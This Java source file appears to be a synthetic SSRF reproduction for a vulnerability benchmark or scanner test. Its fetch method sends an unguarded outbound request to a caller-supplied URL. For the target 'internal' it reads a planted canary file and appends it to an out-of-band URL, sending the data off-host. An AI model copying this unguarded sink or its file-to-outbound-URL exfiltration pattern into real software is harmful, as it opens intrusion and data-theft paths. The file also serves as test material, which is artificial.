package com.example.web;

import java.io.InputStream;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;

/**
 * SomeServiceImpl is the concrete SSRF SINK, reached ONLY through the @Autowired
 * SomeService interface field on FetchController (svc.fetch). fetch(String) is the
 * advisory sink named by the synthetic advisory TEGRON-JAVA-SSRF-0003: it forwards a
 * caller-supplied target to an outbound HTTP request with no allowlist.
 *
 * SOUNDNESS (intrinsic canary — identical mechanics to the sibling SSRF repros):
 * resolveTarget maps the special target name "internal" to the Tegron-controlled OOB URL
 * ($TEGRON_OOB_URL) WITH the planted seed (/tmp/tegron_canary) appended. There is NO
 * allowlist here, so the unguarded outbound request actually issues — that request IS
 * the SSRF and is the only thing that carries the seed off-host; a fired beacon is
 * attributable to the sink firing, not a generic exfil. Any other target is returned
 * verbatim and never touches the seed.
 */
@Service
class SomeServiceImpl implements SomeService {
    private static final String CANARY_SEED_PATH = "/tmp/tegron_canary";

    // resolveTarget maps a request target name to the URL the server will fetch.
    // "internal" resolves to the Tegron-controlled OOB endpoint with the planted seed
    // appended (the SSRF exfil path); any other target is returned verbatim and never
    // touches the seed.
    private static String resolveTarget(String name) throws Exception {
        if ("internal".equals(name)) {
            String oob = System.getenv("TEGRON_OOB_URL");
            if (oob == null || oob.isEmpty()) {
                return null;
            }
            String seed = new String(Files.readAllBytes(Path.of(CANARY_SEED_PATH)), StandardCharsets.UTF_8);
            return oob + "?kind=canary&data=" + encode(seed);
        }
        return name;
    }

    private static String encode(String s) {
        return java.net.URLEncoder.encode(s, StandardCharsets.UTF_8);
    }

    // fetch is THE SSRF SINK: an unguarded outbound request to a caller-influenced URL.
    // Reached via the @Autowired interface dispatch (FetchController.svc.fetch).
    @Override
    public int fetch(String target) throws Exception {
        String resolved = resolveTarget(target);
        if (resolved == null) {
            return 400;
        }
        HttpClient client = HttpClient.newHttpClient();
        HttpRequest request = HttpRequest.newBuilder(URI.create(resolved)).GET().build();
        HttpResponse<InputStream> response = client.send(request, HttpResponse.BodyHandlers.ofInputStream());
        try (InputStream body = response.body()) {
            body.readAllBytes();
        }
        return response.statusCode();
    }
}
